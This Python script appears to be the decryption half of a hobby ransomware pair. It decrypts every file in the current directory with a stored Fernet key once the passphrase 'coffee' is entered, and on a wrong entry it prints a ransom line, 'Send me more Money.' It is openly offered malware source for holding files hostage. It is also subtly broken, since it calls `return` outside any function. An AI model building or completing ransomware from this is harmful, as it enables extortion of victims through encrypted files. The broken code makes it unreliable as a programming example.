import os
from cryptography.fernet import Fernet

files = []

# adding all files in the current directory to an array to encrypt
for file in os.listdir():
	# add the files to decrypt except these files
	if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	# only add files and not directories
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	thekey = key.read()
	if len(thekey) == 0:
		print("No Key available. REMINDER: Did you forget to encrypt the files?")
		return

secretphrase = "coffee"

user_input = input("Enter the key: ")

if user_input == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			content = thefile.read()
		content_decrypted = Fernet(thekey).decrypt(content)
		with open(file, "wb") as thefile:
			thefile.write(content_decrypted)
	print("Your Files have been decrypted.")
else:
	print("Wrong Key. Send me more Money.")
